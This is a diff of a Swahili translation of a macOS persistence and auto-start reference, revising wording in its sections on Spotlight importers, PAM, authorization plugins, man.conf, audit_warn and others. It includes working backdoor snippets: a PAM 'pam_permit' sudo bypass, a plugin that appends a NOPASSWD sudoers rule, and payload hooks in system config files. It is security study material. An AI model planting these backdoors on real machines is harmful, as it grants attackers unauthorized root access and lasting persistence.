-**Compile bundle ya color picker** ikiwa na code yako (unaweza kutumia [**hii kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na uongeze constructor (kama ilivyo katika [sehemu ya Screen Saver](macos-auto-start-locations.md#screen-saver)) kisha unakili bundle kwenye `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>
+**Compile** bundle ya color picker kwa kutumia code yako (unaweza kutumia [**hiki kwa mfano**](https://github.com/viktorstrate/color-picker-plus)) na uongeze constructor (kama ilivyo katika [sehemu ya Screen Saver](macos-auto-start-locations.md#screen-saver)) kisha nakili bundle hiyo hadi `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>
 
-Kisha, color picker inapotriggeriwa, code yako inapaswa pia kutekelezwa.
+Kisha, color picker inapo-triggeriwa, bundle yako inapaswa kutekelezwa pia.
 
 Kumbuka kwamba binary inayopakia library yako ina **sandbox yenye vizuizi vikali sana**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 ```bash
@@ -946,10 +946,10 @@ Kumbuka kwamba binary inayopakia library yako ina **sandbox yenye vizuizi vikali
 ```
 ### Finder Sync Plugins
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
-**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>
+**Maelezo**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
+**Maelezo**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: **Hapana, kwa sababu unahitaji ku-execute app yako mwenyewe**
+- Muhimu kwa bypass ya sandbox: **Hapana, kwa sababu unahitaji ku-execute app yako mwenyewe**
 - TCC bypass: ???
 
 #### Mahali
@@ -960,21 +960,21 @@ Kumbuka kwamba binary inayopakia library yako ina **sandbox yenye vizuizi vikali
 
 Mfano wa application yenye Finder Sync Extension [**unaweza kuupata hapa**](https://github.com/D00MFist/InSync).
 
-Applications zinaweza kuwa na `Finder Sync Extensions`. Extension hii itawekwa ndani ya application ambayo ita-execute. Zaidi ya hayo, ili extension iweze ku-execute code yake, **lazima isainiwe** kwa kutumia Apple developer certificate halali, lazima iwe **sandboxed** (ingawa relaxed exceptions zinaweza kuongezwa), na lazima isajiliwe kwa kitu kama:<sup>[[21]](#references)[[22]](#references)</sup>
+Applications zinaweza kuwa na `Finder Sync Extensions`. Extension hii itawekwa ndani ya application ambayo ita-execute. Zaidi ya hayo, ili extension iweze ku-execute code yake, **lazima isainiwe** kwa kutumia Apple developer certificate halali, lazima iwe `sandboxed` (ingawa exceptions zilizolegezwa zinaweza kuongezwa) na lazima isajiliwe kwa kitu kama:<sup>[[21]](#references)[[22]](#references)</sup>
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
 ```
 ### Screen Saver
 
-Maelezo: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
-Maelezo: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>
+Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
+Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>
 
 - Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 - Lakini utaishia kwenye sandbox ya application ya kawaida
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Mahali
+#### Location
 
 - `/System/Library/Screen Savers`
 - Root inahitajika
@@ -987,11 +987,11 @@ Maelezo: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://p
 
 <figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>
 
-#### Maelezo na Exploit
+#### Description & Exploit
 
-Create project mpya katika Xcode na uchague template ya kutengeneza **Screen Saver** mpya. Kisha, ongeza code yako, kwa mfano code ifuatayo ya kutengeneza logs.<sup>[[23]](#references)[[24]](#references)</sup>
+Unda project mpya katika Xcode na uchague template ya kutengeneza **Screen Saver** mpya. Kisha, ongeza code yako, kwa mfano code ifuatayo ya kutengeneza logs.<sup>[[23]](#references)[[24]](#references)</sup>
 
-**Build** it, kisha nakili bundle ya `.saver` kwenda **`~/Library/Screen Savers`**. Halafu, fungua Screen Saver GUI na ukibofya tu juu yake, inapaswa kutengeneza logs nyingi:
+**Build** it, na nakili bundle ya `.saver` kwenye **`~/Library/Screen Savers`**. Kisha, fungua Screen Saver GUI na uibofye tu; inapaswa kutengeneza logs nyingi:
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'
 
@@ -1001,7 +1001,7 @@ Timestamp                       (process)[PID]
 2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
 ```
 > [!CAUTION]
-> Kumbuka kwamba kwa kuwa ndani ya entitlements za binary inayopakia msimbo huu (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`**, utakuwa **ndani ya application sandbox ya kawaida**.
+> Kumbuka kwamba kwa sababu ndani ya entitlements za binary inayopakia code hii (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) unaweza kupata **`com.apple.security.app-sandbox`**, utakuwa **ndani ya common application sandbox**.
 
 Msimbo wa Saver:
 ```objectivec
@@ -1073,35 +1073,35 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 
 writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>
 
-- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 - Lakini utaishia kwenye application sandbox
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 - Sandbox inaonekana kuwa na mipaka mikubwa
 
-#### Location
+#### Mahali
 
 - `~/Library/Spotlight/`
-- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
+- **Kichochezi**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
 - `/Library/Spotlight/`
-- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
-- Root required
+- **Kichochezi**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
+- Root inahitajika
 - `/System/Library/Spotlight/`
-- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
-- Root required
+- **Kichochezi**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
+- Root inahitajika
 - `Some.app/Contents/Library/Spotlight/`
-- **Trigger**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
-- New app required
+- **Kichochezi**: Faili mpya yenye extension inayodhibitiwa na Spotlight plugin inaundwa.
+- App mpya inahitajika
 
-#### Description & Exploitation
+#### Maelezo na Exploitation
 
-Spotlight ni kipengele cha utafutaji kilichojengwa ndani ya macOS, kilichoundwa kuwapa watumiaji **ufikiaji wa haraka na mpana wa data iliyo kwenye kompyuta zao**.\
-Ili kuwezesha uwezo huu wa utafutaji wa haraka, Spotlight hudumisha **database ya proprietary** na huunda index kwa **kuparse mafaili mengi**, hivyo kuwezesha utafutaji wa haraka kupitia majina ya mafaili pamoja na maudhui yake.<sup>[[25]](#references)</sup>
+Spotlight ni kipengele cha utafutaji kilichojengwa ndani ya macOS, kilichoundwa kuwapa watumiaji **ufikiaji wa haraka na wa kina wa data kwenye computers zao**.\
+Ili kuwezesha uwezo huu wa utafutaji wa haraka, Spotlight hudumisha **database ya proprietary** na huunda index kwa **kupitia files nyingi**, hivyo kuwezesha utafutaji wa haraka kupitia majina ya files na maudhui yake.<sup>[[25]](#references)</sup>
 
-Msingi wa utendaji wa Spotlight unahusisha process kuu inayoitwa 'mds', ambayo inamaanisha **'metadata server'.** Process hii huratibu huduma yote ya Spotlight. Kwa kuongezea, kuna daemons nyingi za 'mdworker' zinazotekeleza kazi mbalimbali za maintenance, kama vile ku-index aina tofauti za mafaili (`ps -ef | grep mdworker`). Kazi hizi huwezeshwa na Spotlight importer plugins, au **".mdimporter bundles**", ambazo huwezesha Spotlight kuelewa na ku-index maudhui katika anuwai kubwa ya formats za mafaili.
+Mfumo wa msingi wa Spotlight unahusisha process kuu inayoitwa 'mds', ambayo inamaanisha **'metadata server'.** Process hii huratibu huduma nzima ya Spotlight. Sambamba nayo, kuna daemons nyingi za 'mdworker' zinazotekeleza kazi mbalimbali za maintenance, kama vile ku-index aina tofauti za files (`ps -ef | grep mdworker`). Kazi hizi zinawezekana kupitia Spotlight importer plugins, au **".mdimporter bundles**", ambazo huiwezesha Spotlight kuelewa na ku-index maudhui katika formats mbalimbali za files.
 
-Plugins au **`.mdimporter`** bundles zinapatikana katika maeneo yaliyotajwa hapo awali, na bundle mpya ikitokea hupakiwa ndani ya dakika moja (hakuna haja ya kurestart service yoyote). Bundles hizi zinahitaji kubainisha ni **aina gani ya mafaili na extensions gani zinaweza kudhibiti**, ili Spotlight izitumie wakati faili mpya yenye extension iliyobainishwa inapoundwa.
+Plugins au **`.mdimporter`** bundles zinapatikana katika maeneo yaliyotajwa awali, na bundle mpya ikitokea hupakiwa ndani ya dakika (hakuna haja ya kurestart service yoyote). Bundles hizi zinahitaji kuonyesha ni **file type na extensions zipi zinaweza kusimamia**, kwa njia hii, Spotlight itazitumia wakati file mpya yenye extension iliyoonyeshwa inapoundwa.
 
-Inawezekana **kupata `mdimporters`** zote zilizopakiwa kwa kuendesha:
+Inawezekana **kupata `mdimporters` zote** zilizopakiwa kwa kuendesha:
 ```bash
 mdimport -L
 Paths: id(501) (
@@ -1110,7 +1110,7 @@ Paths: id(501) (
 "/System/Library/Spotlight/PDF.mdimporter",
 [...]
 ```
-Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumika kuchanganua aina hizi za faili (viendelezi `.iba` na `.book`, miongoni mwa vingine):
+Na kwa mfano **/Library/Spotlight/iBooksAuthor.mdimporter** hutumika kuchanganua aina hizi za faili (viendelezi `.iba` na `.book` miongoni mwa vingine):
 ```json
 plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 
@@ -1147,23 +1147,23 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 > [!CAUTION]
-> Ukikagua Plist ya `mdimporter` nyingine huenda usipate ingizo **`UTTypeConformsTo`**. Hiyo ni kwa sababu ni _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) iliyojengwa ndani, na haihitaji kutaja extensions.
+> Ukikagua Plist ya `mdimporter` nyingine huenda usipate ingizo **`UTTypeConformsTo`**. Hiyo ni kwa sababu ni _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) iliyojengwa ndani, na haihitaji kubainisha extensions.
 >
-> Zaidi ya hayo, plugins za msingi za System hutangulia kila mara, kwa hiyo mshambuliaji anaweza kufikia faili ambazo hazija-indexiwa na `mdimporters` za Apple zenyewe.
+> Zaidi ya hayo, plugins chaguomsingi za System huwa na kipaumbele kila mara, kwa hivyo attacker anaweza kufikia tu files ambazo hazija-indexiwa vinginevyo na `mdimporters` za Apple zenyewe.
 
-Ili kuunda importer yako mwenyewe, unaweza kuanza na project hii: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), kisha ubadilishe jina, **`CFBundleDocumentTypes`**, na uongeze **`UTImportedTypeDeclarations`** ili iauni extension unayotaka ku-support, na uziakisi katika **`schema.xml`**.\
-Kisha **badilisha** code ya function **`GetMetadataForFile`** ili itekeleze payload yako wakati faili yenye extension iliyochakatwa inaundwa.
+Ili kuunda importer yako mwenyewe, unaweza kuanza na project hii: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), kisha ubadilishe jina, **`CFBundleDocumentTypes`**, na uongeze **`UTImportedTypeDeclarations`** ili iunge mkono extension unayotaka kuunga mkono, na uziakisi katika **`schema.xml`**.\
+Kisha **badilisha** code ya function **`GetMetadataForFile`** ili itekeleze payload yako wakati file yenye extension iliyochakatwa inapoundwa.
 
 Hatimaye, **build na copy `.mdimporter` yako mpya** kwenye mojawapo ya locations tatu zilizotajwa awali. Unaweza kuangalia ikiwa imepakiwa kwa **kufuatilia logs** au kuendesha **`mdimport -L`**.
 
 ### ~~Preference Pane~~
 
 > [!CAUTION]
-> Haionekani kama hii bado inafanya kazi.
+> Haionekani kuwa hii bado inafanya kazi.
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>
 
-- Muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Muhimu kwa sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
 - Inahitaji user action maalum
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
@@ -1175,33 +1175,33 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.g
 
 #### Description
 
-Haionekani kama hii bado inafanya kazi.<sup>[[26]](#references)</sup>
+Haionekani kuwa hii bado inafanya kazi.<sup>[[26]](#references)</sup>
 
 ## Root Sandbox Bypass
 
 > [!TIP]
-> Hapa unaweza kupata start locations zinazofaa kwa **sandbox bypass**, zinazokuruhusu kutekeleza kitu kwa urahisi kwa **kukiandika kwenye faili** ukiwa **root** na/au zikihitaji **hali nyingine zisizo za kawaida.**
+> Hapa unaweza kupata locations za kujiendesha zinazofaa kwa **sandbox bypass**, zinazokuruhusu kutekeleza kitu kwa urahisi kwa **kukiiandika kwenye file** ukiwa **root** na/au zikihitaji **masharti mengine yasiyo ya kawaida.**
 
 ### Periodic
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>
 
-- Muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Lakini lazima uwe root
+- Muhimu kwa sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
+- Lakini unahitaji kuwa root
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Location
 
 - `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
 - Root inahitajika
-- **Trigger**: Wakati muda unapofika
+- **Trigger**: Wakati muda unapowadia
 - `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local`
 - Root inahitajika
-- **Trigger**: Wakati muda unapofika
+- **Trigger**: Wakati muda unapowadia
 
 #### Description & Exploitation
 
-Scripts za periodic (**`/etc/periodic`**) hutekelezwa kwa sababu ya **launch daemons** zilizosanidiwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kumbuka kwamba scripts zilizohifadhiwa katika `/etc/periodic/` **hutekelezwa** kama **owner wa faili,** kwa hiyo hii haitafanya kazi kwa privilege escalation inayowezekana.<sup>[[27]](#references)</sup>
+Scripts za periodic (**`/etc/periodic`**) hutekelezwa kutokana na **launch daemons** zilizosanidiwa katika `/System/Library/LaunchDaemons/com.apple.periodic*`. Kumbuka kwamba scripts zilizohifadhiwa katika `/etc/periodic/` **hutekelezwa** kama **owner wa file,** kwa hivyo hii haitafanya kazi kwa uwezekano wa privilege escalation.<sup>[[27]](#references)</sup>
 ```bash
 # Launch daemons that will execute the periodic scripts
 ls -l /System/Library/LaunchDaemons/com.apple.periodic*
@@ -1239,33 +1239,33 @@ daily_local="/etc/daily.local"				# Local scripts
 weekly_local="/etc/weekly.local"			# Local scripts
 monthly_local="/etc/monthly.local"			# Local scripts
 ```
-Ukifanikiwa kuandika faili yoyote kati ya `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` **itatekelezwa mapema au baadaye**.
+Ukifanikiwa kuandika faili lolote kati ya `/etc/daily.local`, `/etc/weekly.local` au `/etc/monthly.local` lita-**executed sooner or later**.
 
 > [!WARNING]
-> Kumbuka kwamba script ya periodic **itatekelezwa kama mmiliki wa script hiyo**. Kwa hiyo, ikiwa mtumiaji wa kawaida ndiye anayemiliki script hiyo, itatekelezwa na mtumiaji huyo (hili linaweza kuzuia mashambulizi ya privilege escalation).
+> Kumbuka kwamba script ya periodic ita-**executed as the owner of the script**. Kwa hiyo, ikiwa mtumiaji wa kawaida ndiye anayemiliki script, ita-**executed** kama mtumiaji huyo (hili linaweza kuzuia mashambulizi ya privilege escalation).
 
 ### PAM
 
 Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
 Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>
 
-- Inafaa kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Ni muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
 - Lakini unahitaji kuwa root
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Mahali
 
 - Root inahitajika kila wakati
 
-#### Description & Exploitation
+#### Maelezo na Exploitation
 
-Kwa kuwa PAM inalenga zaidi **persistence** na malware kuliko execution rahisi ndani ya macOS, blogu hii haitatoa maelezo ya kina, **soma writeups ili kuelewa vizuri zaidi technique hii**.<sup>[[28]](#references)</sup>
+Kwa kuwa PAM inalenga zaidi **persistence** na malware kuliko execution rahisi ndani ya macOS, blogu hii haitatoa maelezo ya kina; **soma writeups ili kuelewa technique hii vizuri zaidi**.<sup>[[28]](#references)</sup>
 
-Kagua modules za PAM kwa kutumia:
+Kagua PAM modules kwa:
 ```bash
 ls -l /etc/pam.d
 ```
-Mbinu ya persistence/privilege escalation inayotumia vibaya PAM ni rahisi kama kurekebisha module /etc/pam.d/sudo kwa kuongeza mwanzoni mstari:
+Mbinu ya persistence/privilege escalation inayotumia vibaya PAM ni rahisi kama kurekebisha module /etc/pam.d/sudo na kuongeza mwanzoni mstari:
 ```bash
 auth       sufficient     pam_permit.so
 ```
@@ -1280,12 +1280,12 @@ account    required       pam_permit.so
 password   required       pam_deny.so
 session    required       pam_permit.so
 ```
-Na hivyo basi jaribio lolote la kutumia **`sudo` litafanya kazi**.
+Na kwa hiyo jaribio lolote la kutumia **`sudo` litafanya kazi**.
 
 > [!CAUTION]
-> Kumbuka kwamba directory hii inalindwa na TCC, kwa hivyo kuna uwezekano mkubwa mtumiaji ataonyeshwa prompt ya kuomba ruhusa ya kufikia.
+> Kumbuka kwamba directory hii inalindwa na TCC, hivyo kuna uwezekano mkubwa mtumiaji ataonyeshwa prompt akiuliza ruhusa ya kuifikia.
 
-Mfano mwingine mzuri ni su, ambapo unaweza kuona kwamba pia inawezekana kuzipa PAM modules parameters (na unaweza pia kuweka backdoor kwenye file hii):
+Mfano mwingine mzuri ni su, ambapo unaweza kuona kwamba pia inawezekana kuzipa PAM modules parameters (na unaweza pia kuifanya backdoor faili hii):
 ```bash
 cat /etc/pam.d/su
 # su: auth account session
@@ -1301,8 +1301,8 @@ session    required       pam_launchd.so
 Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
 Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>
 
-- Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Lakini unahitaji kuwa root na kufanya mipangilio ya ziada
+- Inasaidia kupita sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Lakini unahitaji kuwa root na kufanya configs za ziada
 - TCC bypass: ???
 
 #### Mahali
@@ -1311,9 +1311,9 @@ Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authoriza
 - Root inahitajika
 - Pia inahitajika kusanidi authorization database ili itumie plugin
 
-#### Maelezo na Exploitation
+#### Maelezo & Exploitation
 
-Unaweza kuunda authorization plugin ambayo itatekelezwa mtumiaji anapoingia ili kudumisha persistence. Kwa maelezo zaidi kuhusu jinsi ya kuunda mojawapo ya plugins hizi, angalia writeup zilizotangulia (na uwe mwangalifu, plugin iliyoandikwa vibaya inaweza kukufungia nje, na utahitaji kusafisha Mac yako ukiwa kwenye recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>
+Unaweza kuunda authorization plugin ambayo itatekelezwa mtumiaji anapoingia ili kudumisha persistence. Kwa maelezo zaidi kuhusu jinsi ya kuunda mojawapo ya plugins hizi, angalia writeups zilizotangulia (na uwe mwangalifu, plugin iliyoandikwa vibaya inaweza kukufungia nje na utahitaji kusafisha Mac yako ukiwa kwenye recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1328,7 +1328,7 @@ NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
 system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 }
 ```
-**Hamisha** bundle hadi eneo itakapopakiwa:
+**Hamisha** bundle hadi eneo ambalo itapakiwa:
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
@@ -1351,33 +1351,33 @@ EOF
 
 security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
-**`evaluate-mechanisms`** itaueleza authorization framework kwamba itahitaji **kuita external mechanism kwa ajili ya authorization**. Zaidi ya hayo, **`privileged`** itafanya itekelezwe na root.
+**`evaluate-mechanisms`** itaambia mfumo wa authorization kwamba utahitaji **kuita mechanism ya nje kwa ajili ya authorization**. Zaidi ya hayo, **`privileged`** itafanya itekelezwe na root.
 
-I-trigger kwa:
+Ianzishe kwa:
 ```bash
 security authorize com.asdf.asdf
 ```
-Na kisha **staff group inapaswa kuwa na** access ya sudo (soma `/etc/sudoers` kuthibitisha).
+Na kisha **staff group inapaswa kuwa na** access ya sudo (soma `/etc/sudoers` ili kuthibitisha).
 
 ### Man.conf
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>
 
-- Ni muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Lakini unahitaji kuwa root na mtumiaji lazima atumie man
+- Muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Lakini unahitaji kuwa root na user lazima atumie man
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Mahali
 
 - **`/private/etc/man.conf`**
 - Root inahitajika
-- **`/private/etc/man.conf`**: Kila wakati man inapotumika
+- **`/private/etc/man.conf`**: Kila mara man inapotumika
 
-#### Description & Exploit
+#### Maelezo & Exploit
 
-Config file **`/private/etc/man.conf`** inaonyesha binary/script ya kutumia wakati wa kufungua man documentation files. Kwa hivyo path ya executable inaweza kubadilishwa ili kila wakati mtumiaji anapotumia man kusoma docs, backdoor itekelezwe.<sup>[[31]](#references)</sup>
+Config file **`/private/etc/man.conf`** inaonyesha binary/script itakayotumika wakati wa kufungua mafaili ya documentation ya man. Kwa hivyo path ya executable inaweza kubadilishwa ili kila wakati user anapotumia man kusoma docs, backdoor itekelezwe.<sup>[[31]](#references)</sup>
 
-Kwa mfano weka katika **`/private/etc/man.conf`**:
+Kwa mfano, weka katika **`/private/etc/man.conf`**:
 ```
 MANPAGER /tmp/view
 ```
@@ -1391,10 +1391,10 @@ touch /tmp/manconf
 ```
 ### Apache2
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>
+**Andiko**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>
 
 - Muhimu kwa kubypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Lakini unahitaji kuwa root na apache lazima iwe inaendesha
+- Lakini unahitaji kuwa root na apache lazima iwe inaendeshwa
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 - Httpd haina entitlements
 
@@ -1402,21 +1402,21 @@ touch /tmp/manconf
 
 - **`/etc/apache2/httpd.conf`**
 - Root inahitajika
-- Trigger: Apache2 inapoanzishwa
+- Kichochezi: Apache2 inapoanzishwa
 
 #### Maelezo na Exploit
 
-Unaweza kuashiria katika `/etc/apache2/httpd.conf` kupakia module kwa kuongeza mstari kama huu:<sup>[[32]](#references)</sup>
+Unaweza kuonyesha katika `/etc/apache2/httpd.conf` ipakie module kwa kuongeza mstari kama huu:<sup>[[32]](#references)</sup>
 ```bash
 LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 ```
-Kwa njia hii, module yako iliyokusanywa itapakiwa na Apache. Jambo pekee ni kwamba unahitaji ama **kui-sign kwa kutumia Apple certificate halali**, au **kuongeza certificate mpya inayoaminika** kwenye mfumo na **kui-sign** kwa kuitumia.
+Kwa njia hii, module yako iliyokusanywa itapakiwa na Apache. Jambo pekee ni kwamba unahitaji ama **kuitia saini kwa Apple certificate halali**, au **kuongeza certificate mpya inayoaminika** kwenye mfumo na **kuitia saini** kwa kutumia hiyo.
 
 Kisha, ikihitajika, ili kuhakikisha kuwa server itaanzishwa unaweza kutekeleza:
 ```bash
 sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
 ```
-Mfano wa code wa Dylb:
+Mfano wa code ya Dylb:
 ```objectivec
 #include <stdio.h>
 #include <syslog.h>
@@ -1428,38 +1428,38 @@ printf("[+] dylib constructor called from %s\n", argv[0]);
 syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 }
 ```
-### Mfumo wa ukaguzi wa BSM
+### BSM audit framework
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>
 
-- Muhimu kwa bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Lakini unahitaji kuwa root, auditd iwe inaendelea kufanya kazi na usababishe warning
+- Muhimu kwa bypass ya sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Lakini unahitaji kuwa root, auditd iwe inaendelea kufanya kazi na usababisha warning
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Mahali
 
 - **`/etc/security/audit_warn`**
 - Root inahitajika
-- **Trigger**: Wakati auditd inapogundua warning
+- **Trigger**: Wakati auditd inapotambua warning
 
-#### Maelezo na Exploit
+#### Maelezo & Exploit
 
-Kila auditd inapogundua warning, script **`/etc/security/audit_warn`** **hutekelezwa**. Kwa hivyo unaweza kuongeza payload yako ndani yake.<sup>[[33]](#references)</sup>
+Kila wakati auditd inapotambua warning, script **`/etc/security/audit_warn`** **inatekelezwa**. Kwa hivyo unaweza kuongeza payload yako humo.<sup>[[33]](#references)</sup>
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
 Unaweza kulazimisha onyo kwa kutumia `sudo audit -n`.
 
-### Startup Items
+### Vipengee vya Kuanzisha
 
-> [!CAUTION] > **Hii imepitwa na wakati, kwa hivyo hakuna kitu kinachopaswa kupatikana katika directories hizo.**
+> [!CAUTION] > **Hii imeacha kutumika, kwa hiyo hakuna chochote kinachopaswa kupatikana katika saraka hizo.**
 
-**StartupItem** ni directory inayopaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Baada ya directory hii kuanzishwa, lazima iwe na mafaili mawili maalum:
+**StartupItem** ni saraka inayopaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Baada ya saraka hii kuundwa, lazima iwe na faili mbili mahususi:
 
-1. **rc script**: Shell script inayotekelezwa wakati wa startup.
-2. **plist file**, iliyopewa jina maalum `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya configuration.
+1. **rc script**: Shell script inayotekelezwa wakati wa kuanzisha mfumo.
+2. **plist file**, yenye jina maalum `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya usanidi.
 
-Hakikisha kwamba rc script na faili la `StartupParameters.plist` vimewekwa kwa usahihi ndani ya directory ya **StartupItem** ili startup process iweze kuvitambua na kuvitumia.
+Hakikisha kwamba **rc script** na faili ya `StartupParameters.plist` zimewekwa ipasavyo ndani ya saraka ya **StartupItem** ili mchakato wa kuanzisha mfumo uweze kuzitambua na kuzitumia.
 
 {{#tabs}}
 {{#tab name="StartupParameters.plist"}}
@@ -1506,13 +1506,13 @@ RunService "$1"
 ### ~~emond~~
 
 > [!CAUTION]
-> Siwezi kupata component hii kwenye macOS yangu, kwa hiyo angalia writeup kwa maelezo zaidi
